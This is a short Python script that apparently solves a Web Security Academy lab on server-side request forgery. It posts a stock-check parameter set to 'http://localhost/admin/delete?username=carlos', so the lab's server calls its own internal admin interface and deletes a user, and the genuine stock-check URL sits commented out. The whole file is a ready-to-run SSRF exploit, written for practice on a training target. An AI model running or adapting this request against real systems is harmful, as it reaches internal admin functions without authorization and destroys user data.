# <FMI> (Fill Me In) denotes a value you will need to modify
import requests
stock_url = 'https://acdf1fec1ef6373ac024081d005a0054.web-security-academy.net/product/stock'

stock_api_data = {
    'stockApi': 'http://localhost/admin/delete?username=carlos'
    # 'stockApi': 'http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1'
}
resp = requests.post(stock_url, data=stock_api_data)
print(resp.text)